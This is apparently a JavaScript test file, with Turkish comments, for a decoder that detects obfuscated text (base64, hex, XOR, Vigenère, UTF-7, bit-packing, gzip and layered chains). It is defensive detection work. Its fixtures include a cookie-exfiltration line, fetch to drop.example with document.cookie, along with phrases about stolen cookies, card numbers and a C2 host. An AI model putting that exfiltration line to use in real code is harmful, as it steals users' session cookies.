// Kodlama tanıma öz-denetimi: node test/encodings.test.js
import assert from 'node:assert/strict';
import { decodeCandidates, rot, atbash } from '../src/core/encodings.js';

const best = (s) => decodeCandidates(s)[0];
const plain = 'the secret endpoint is hidden here';
const b64 = Buffer.from(plain).toString('base64');
assert.equal(best(b64).encoding, 'base64');
assert.equal(best(b64).text, plain);
assert.equal(best(Buffer.from(plain).toString('hex')).text, plain);
const b32 = (buf) => {
  const A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  let bits = 0, value = 0, out = '';
  for (const b of buf) { value = (value << 8) | b; bits += 8; while (bits >= 5) { out += A[(value >>> (bits - 5)) & 31]; bits -= 5; } }
  if (bits) out += A[(value << (5 - bits)) & 31];
  return out;
};
assert.equal(best(b32(Buffer.from(plain))).text, plain);
assert.equal(best('&#116;&#104;&#101; &#115;ecret endpoint').text, 'the secret endpoint');
assert.equal(best(rot(plain, 13)).text, plain);
assert.equal(best(atbash(plain)).text, plain);
const xored = Buffer.from([...Buffer.from(plain)].map((b) => b ^ 0x5a)).toString('hex');
const x = best(xored);
assert.equal(x.text, plain);
assert.equal(x.key, '0x5a');
assert.deepEqual(decodeCandidates('normal readable sentence here'), []);
// Vigenère: yeterince uzun metinde anahtar sütun sütun ki-kare ile bulunur
const long = 'send the stolen card numbers to the collection server every night at three';
let ki = 0;
const vig = long.replace(/[a-z]/g, (c) => String.fromCharCode(((c.charCodeAt(0) - 97 + 'key'.charCodeAt(ki++ % 3) - 97) % 26) + 97));
const v = decodeCandidates(vig).find((c) => c.encoding === 'vigenere');
assert.ok(v, 'vigenere adayı');
assert.equal(v.key, 'key');

// E68: UTF-7 ve CESU-8
const { utf7, cesu8, base91, unpackBits, decodeChain, encodingReport } = await import('../src/core/encodings.js');
assert.equal(utf7('Hi Mom -+Jjo--!'), 'Hi Mom -☺-!');
assert.equal(utf7('+AGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AZQB4AGEAbQBwAGwAZQ-'), 'https://evil.example');
assert.equal(utf7('a+b'), null);
// U+1F600 CESU-8: ED A0 BD ED B8 80; NUL: C0 80
assert.equal(cesu8([0x41, 0xed, 0xa0, 0xbd, 0xed, 0xb8, 0x80, 0xc0, 0x80]), 'A\u{1F600}\u0000');
assert.equal(cesu8([0x41, 0x42]), null);
// basE91 (referans: "test" → "fPNKd")
assert.equal(String.fromCharCode(...base91('fPNKd')), 'test');
// E88: 7 bit paketleme (MSB önce) ve 6 bit SIXBIT
const pack = (text, w) => {
  let bits = '';
  for (const ch of text) bits += (w === 6 ? ch.charCodeAt(0) - 32 : ch.charCodeAt(0)).toString(2).padStart(w, '0');
  bits = bits.padEnd(Math.ceil(bits.length / 8) * 8, '0');
  return bits.match(/.{8}/g).map((b) => parseInt(b, 2));
};
assert.equal(unpackBits(pack('hidden c2 host', 7), 7), 'hidden c2 host');
assert.equal(unpackBits(pack('HELLO WORLD', 6), 6), 'HELLO WORLD');
const packedHex = Buffer.from(pack('send the cookies to the attacker now', 7)).toString('hex');
assert.equal(best(packedHex).encoding, 'hex+bit7');
// E88: otomatik arama 5 ve 6 bit genişlikleri de kapsar; rastgele veride yanlış pozitif yok
const FIVE = 'abcdefghijklmnopqrstuvwxyz .,!?';
const packWith = (vals, w) => {
  let bits = vals.map((v) => v.toString(2).padStart(w, '0')).join('');
  bits = bits.padEnd(Math.ceil(bits.length / 8) * 8, '0');
  return Buffer.from(bits.match(/.{8}/g).map((b) => parseInt(b, 2))).toString('hex');
};
const msg5 = 'send the stolen cookies to the attacker tonight';
assert.equal(best(packWith([...msg5].map((c) => FIVE.indexOf(c)), 5)).encoding, 'hex+bit5');
assert.equal(best(packWith([...msg5].map((c) => FIVE.indexOf(c)), 5)).text, msg5);
const msg6 = 'SEND THE STOLEN COOKIES TO THE ATTACKER TONIGHT';
assert.equal(best(packWith([...msg6].map((c) => c.charCodeAt(0) - 32), 6)).text, msg6);
const { randomBytes } = await import('node:crypto');
for (let i = 0; i < 40; i++) {
  const r = decodeCandidates(randomBytes(24).toString('hex'));
  assert.ok(!r.some((c) => /bit[56]/.test(c.encoding)), `rastgele veri bit5/6 sanılmamalı: ${JSON.stringify(r[0])}`);
}
// E90: base64 içinde gzip blob
const { gzipSync } = await import('node:zlib');
const gz = gzipSync(Buffer.from('fetch("https://drop.example/x?c=" + document.cookie)')).toString('base64');
assert.equal(best(gz).encoding, 'base64+gzip');
assert.equal(best(gz).text, 'fetch("https://drop.example/x?c=" + document.cookie)');
// E61: MIME satır sonlu ve ters çevrilmiş base64
assert.equal(best(b64.replace(/(.{8})/g, '$1\n')).text, plain);
assert.equal(best([...Buffer.from('the hidden payload!').toString('base64')].reverse().join('')).text, 'the hidden payload!');
// E92 / E621: çok katmanlı zincir ve katman sayısı
const layered = Buffer.from(Buffer.from(Buffer.from(plain).toString('base64')).toString('hex')).toString('base64');
const ch = decodeChain(layered);
assert.equal(ch.text, plain);
assert.deepEqual(ch.layers, ['base64', 'hex', 'base64']);
assert.equal(ch.depth, 3);
assert.equal(encodingReport([layered])[0].best.layers, 3);
assert.equal(encodingReport([b64])[0].best.layers, 1);

console.log('encodings: ok');
